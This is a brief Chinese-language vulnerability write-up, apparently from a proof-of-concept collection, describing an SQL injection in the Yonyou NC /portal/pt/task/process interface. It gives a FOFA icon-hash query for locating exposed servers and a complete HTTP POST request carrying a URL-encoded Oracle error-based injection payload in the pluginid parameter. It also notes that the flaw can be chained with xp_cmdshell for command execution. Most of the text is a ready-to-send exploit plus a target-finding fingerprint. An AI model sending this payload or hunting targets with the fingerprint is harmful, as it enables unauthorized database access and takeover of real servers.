# 用友NC-process存在SQL注入漏洞

用友NC /portal/pt/task/process 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。

## fofa

```javascript
icon_hash="1085941792"
```


## poc

```javascript
POST /portal/pt/task/process?pageId=login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

id=1&oracle=1&pluginid=1%27%20AND%207194%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287194%3D7194%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20dJyN
```

![image-20241128091833680](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280918769.png)
